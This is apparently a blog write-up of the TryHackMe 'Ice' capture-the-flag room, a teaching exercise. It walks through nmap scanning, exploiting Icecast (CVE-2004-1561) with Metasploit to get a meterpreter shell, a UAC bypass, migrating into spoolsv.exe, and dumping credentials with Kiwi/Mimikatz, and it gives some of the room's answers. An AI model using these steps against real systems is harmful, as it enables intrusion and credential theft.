---
layout: blog
title: TryHackMe Ice Writeup
publishDate: 2023-12-08T17:12:00.000Z
description: A step-by-step walk-through of the TryHackMe CTF room - Ice. Its
  based on CVE-2004-1561, a buffer overflow vulnerability on Icecast, a
  multimedia streaming service.
tags:
  - tryhackme
  - writeup
---
## Task 1: Connect

I use OpenVPN to connect to THM servers. You can also download your OpenVPN configuration from https://tryhackme.com/access and connect using this command:

```sh
sudo openvpn <your-config>.ovpn
```

Then, click on the green "Start Machine" button to initiate the target machine. It takes about a minute to start up.

## Task 2: Recon

The first task is always to scan the target. In order to find all the open ports, you can run a TCP SYN scan (using the `-sS` flag in nmap). Check the Nmap output and find which port is running the MSRDP service. It won't be listed as MSRDP or Microsoft Remote Desktop something, but if you look carefully, you'll find a "ms-wbt-server" service running on port 3389.

![Running services](/images/uploads/pasted-image-20231208172254.png)

A quick google search can confirm your suspicions. 

![MS WBT server google search result](/images/uploads/pasted-image-20231208172316.png)

The next question asks you what service is running on port 8000. Well it is http but the the correct answer should be the name of the service which will be shown only if you run a version scan using the `-sV` flag as you can see below. It is "Icecast" - a popular media streaming server.

![Icecast service running on TCP port 8000](/images/uploads/pasted-image-20231208172703.png)

The host name of the machine can be found in the output of a script scan (use the `-sC` flag). The hostname is listed as the "NetBIOS name" in the "Host script results" section of the nmap output. The answer is "DARK-PC".

![Nmap host detection result](/images/uploads/pasted-image-20231208173319.png)

## Task 3: Gain Access

The exact answer to the first question could not be found on the mentioned cvedtails.com website as the website design and layout has been updated since. Visit the website and search for "Icecast" vulnerabilities. You can filter by the rating of 7 or higher. Most of the vulnerabilities will show the type "Buffer Overflow" but the correct answer should be "Execute Code Overflow" (this used to be shown under the Vulnerability type field earlier).

![CVEs of the running version of Icecast](/images/uploads/pasted-image-20231209094114.png)

The CVE that I used is [CVE-2004-1561](https://www.cvedetails.com/cve/CVE-2004-1561/ "CVE-2004-1561 security vulnerability details") as its the only one having a public exploit. Run metasploit and search for "icecast" modules.

![Find the exploit in metasploit](/images/uploads/pasted-image-20231209095846.png)

Only one module should be listed: `exploit/windows/http/icecast_header`
Use the module and check the required options that we need to set. 

![Setting RHOSTS value in metasploit](/images/uploads/pasted-image-20231209095943.png)

RHOSTS specifies the remote hosts, *i.e.*, the target machine IP. Use the command `set RHOSTS <TARGET_IP>` to set the value. By default, LHOST, or the local host (your IP) should be set to eth0 or wlan0 depending on the interface you are using. But, since you're connected to the tryhackme VPN, you should change it to tun0 using `set LHOST tun0` command. Then you can `run` the exploit.

## Task 4: Escalate

If the exploit runs successfully, you'll get a "meterpreter" shell. Run the command `getuid` to check if you are logged in as the user "Dark". We can also gather some more information about the system, for example, the build version and architecture by running the `sysinfo` command.

Run the module `run post/multi/recon/local_exploit_suggester` to find local exploits in the system. We will use the first exploit:

```sh
use exploit/windows/local/bypassuac_eventvwr
```

![Find local exploits after gaining meterpreter shell](/images/uploads/pasted-image-20231209100744.png)

Check the required options in the local exploit. Set the session to 1 (you can check the meterpreter session number using the command `sessions`), and the LHOST to tun0 (if you are using VPN). Now run the exploit.

To verify that we got the escalated shell, run `getprivs`. As you can see we have the access to take ownership of files:

![Output of the getprivs command](/images/uploads/pasted-image-20231209101129.png)

## Task 5: Looting

Before we do anything else, we should migrate to a more stable process. Run the `ps` command and find a process that matches our architecture (x64) and is run by NT AUTHORITY\SYSTEM. The most commonly used process (that always works!) is `spoolsv.exe`.

```sh
migrate -N spoolsv.exe
```

We will use Kiwi (the updated version of Mimikatz), a password dumping tool to retrieve the user password. 

```sh
load kiwi
```

After the tool is loaded, check the meterpreter `help` menu to find the newly added section for Kiwi. Run the `creds_all` command to find the password of the user Dark: `Password01!`.

![Find password of the user Dark using the creds_all command](/images/uploads/pasted-image-20231209101654.png)

## Task 6: Post Exploitation

The questions in this section are straightforward. I won't be sharing the answers as you can easily get them from the meterpreter help menu. You can play around a bit if you want.

Tip: Run the `screenshare` command to get a live view of the remote desktop :)
